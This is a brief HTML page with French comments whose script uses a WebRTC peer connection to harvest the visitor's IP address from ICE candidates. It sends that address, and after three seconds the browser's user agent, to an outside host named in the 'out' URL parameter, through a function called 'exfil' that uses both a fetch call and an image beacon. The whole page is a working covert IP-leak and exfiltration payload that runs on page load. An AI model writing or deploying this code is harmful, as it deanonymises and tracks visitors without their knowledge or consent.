<!DOCTYPE html>
<html>
<head><title>ip</title></head>
<body>
<script>
  const OUT = new URLSearchParams(window.location.search).get("out");

  async function exfil(tag, payload) {
    await fetch(OUT + "/" + tag + "?d=" + encodeURIComponent(JSON.stringify(payload).slice(0, 3000)), {
      mode: "no-cors", keepalive: true
    });
    new Image().src = OUT + "/" + tag + "?d=" + encodeURIComponent(JSON.stringify(payload).slice(0, 1000));
  }

  // Envoie l'IP dès qu'on en trouve une, sans attendre
  const pc = new RTCPeerConnection({ iceServers: [] });
  pc.createDataChannel("");
  pc.createOffer().then(o => pc.setLocalDescription(o));
  pc.onicecandidate = e => {
    if (!e || !e.candidate) return;
    const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
    if (m) exfil("ip", { ip: m[1], candidate: e.candidate.candidate });
  };

  // Double sécurité — envoie tout ce qu'on a après 3s
  setTimeout(() => {
    if (OUT) exfil("timeout", { ua: navigator.userAgent });
  }, 3000);
</script>
</body>
</html>
